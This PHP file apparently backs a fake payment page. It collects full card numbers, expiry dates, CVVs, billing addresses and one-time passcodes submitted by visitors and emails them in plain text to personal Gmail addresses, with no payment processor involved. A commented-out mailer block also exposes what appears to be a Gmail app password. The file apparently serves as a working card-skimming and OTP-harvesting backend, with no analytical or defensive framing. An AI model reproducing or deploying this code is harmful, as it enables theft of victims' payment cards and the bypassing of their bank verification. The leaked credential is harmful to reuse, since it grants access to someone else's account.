<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Handle JSON payload
if ($_SERVER['CONTENT_TYPE'] === 'application/json') {
    $input = file_get_contents('php://input');
    $_POST = json_decode($input, true);
}

function sendEmail($post) {
    $subject = filter_var("Payment Process", FILTER_SANITIZE_STRING);
    $name = filter_var($post['name'], FILTER_SANITIZE_STRING);
    $amount_to_pay = filter_var($post['amount'], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
    $card_number = filter_var($post['cardNumber'], FILTER_SANITIZE_STRING);
    $address = filter_var($post['address'], FILTER_SANITIZE_STRING);
    $city = filter_var($post['city'], FILTER_SANITIZE_STRING);
    $state = filter_var($post['state'], FILTER_SANITIZE_STRING);
    $zipCode = filter_var($post['zipCode'], FILTER_SANITIZE_STRING);
    $card_expiration_year = filter_var($post['expYear'], FILTER_SANITIZE_NUMBER_INT);
    $card_expiration_month = filter_var($post['expMonth'], FILTER_SANITIZE_NUMBER_INT);
    $cvv = filter_var($post['cvv'], FILTER_SANITIZE_NUMBER_INT);
    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
    $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);
    
    // Rest of the sanitization and validation...
    $subject = "Payment Process";
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
    $headers .= "From: {$name} <{$fromEmail}>\r\n";
    $headers .= "Reply-To: {$fromEmail}\r\n";
// Construct email content
$fields = [
    "Billing address" => $address,
    "State" => $state,
    "City" => $city,
    "Zip-code" => $zipCode,
    "Card owner" => $name,
    "Card number" => $card_number,
    "Amount" => $amount_to_pay,
    "Card expiration year" => $card_expiration_year,
    "Card expiration month" => $card_expiration_month,
    "Card CVC" => $cvv,
];
// print_r($fields);

$email_body = "You have received a new message:\n\n" . implode("\n", array_map(
    fn($key, $value) => "$key: $value",
    array_keys($fields),
    $fields
));

$html_body = "<h3>You have received a new message:</h3>";
foreach ($fields as $key => $value) {
    $html_body .= "<p><strong>$key:</strong> $value</p>";
}

// Send email
if (mail($to, $subject, $email_body, $headers)) {
    return "success";
} else {
    return "Failed to send email.";
}
}
function sendContact($post) {
    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
//$subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $name = $post['name'];
    $email = $post['email'];
    $subject = $post['subject'];
    $message = filter_var( $post['message'], FILTER_SANITIZE_STRING);
    // $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
    // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    // $message = filter_var($message, FILTER_SANITIZE_STRING);
    // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
    // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    // $message = filter_var($message, FILTER_SANITIZE_STRING);
    // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
    $fromEmail = filter_var($email, FILTER_SANITIZE_EMAIL);

    // Set headers
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
    $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
    $headers .= "Reply-To: {$fromEmail}" . "\r\n";

    $email_body = $message;
   


    $html_body = "<h3>$message.</h3>";
    // $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    // $html_body .= "<p><strong>card number:</strong> $card_number</p>";
    // $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
    // $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
    // $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
    // $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    // try {
    //     //Server settings
    //     $mail->SMTPDebug = 0;  // Disable verbose debug output
    //     $mail->isSMTP();  // Set mailer to use SMTP
    //     $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
    //     $mail->Username   = "americanresidence435@gmail.com";   // Your Gmail address
    //     $mail->Password   = 'dtwh cnul jqfq uxol';  // Your Gmail password or app-specific password // Your Gmail password or app-specific password
    //     $mail->SMTPSecure = 'ssl';  // Enable TLS encryption
    //     $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP

    //     //Recipients
    //     $mail->setFrom('americanresidence435@gmail.com', 'Resido');  // From email address and name
    //     $mail->addAddress("americanresidence435@gmail.com");  // Recipient email address

    //     // Content
    //     $mail->isHTML(true);  // Set email format to HTML
    //     $mail->Subject = $subject;
    //     $mail->Body    = $email_body;

    //     // Send the email
    //     $mail->send();
    //     echo 'success';
    // } catch (Exception $e) {
    //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    // }
    if (mail($to, $subject, $email_body, $headers)) {
        echo "success";
    } else {
        echo "Failed to send email to";
    }
}
function sendOTP($post) {
    $to = filter_var("americanresidence435@gmail.com", FILTER_SANITIZE_EMAIL);
    $subject = filter_var("payment process OTP", FILTER_SANITIZE_STRING);
    $otp = $post['OTP'];
    
    

    $email_body = "You have received a new message.\n\n";
    $email_body .= "OTP: $otp\n";
    


    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>OTP:</strong> $otp</p>";
    $mail = new PHPMailer(true);  

   
    $name = "me";
    $fromEmail = "agent@americaresides.com";
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
    $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
    $headers .= "Reply-To: {$fromEmail}" . "\r\n";
    if (mail($to, $subject, $email_body, $headers)) {
        echo "success";
    } else {
        echo "Failed to send email to";
    }

    
}

if(isset($_POST['sendcard'])){
    sendEmail($_POST);
}
if(isset($_POST['sendotp'])){
    sendOTP($_POST);
}
if(isset($_POST['contact'])){
    sendContact($_POST);
}


?>

